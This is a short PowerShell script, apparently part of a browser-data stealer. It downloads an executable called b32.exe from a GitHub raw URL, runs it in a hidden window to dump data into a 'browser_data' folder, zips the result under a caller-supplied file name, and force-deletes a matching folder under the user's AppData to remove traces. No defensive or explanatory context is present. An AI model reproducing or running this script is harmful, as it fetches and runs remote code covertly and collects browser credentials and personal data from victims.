param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir browser_data ; Set-Location browser_data
Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe' -OutFile "b32.exe"
Start-Process -FilePath b32.exe -ArgumentList "--format json" -Wait -WindowStyle Hidden

Set-Location ..
Compress-Archive -Path .\browser_data -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\browser_data" -recurse -Force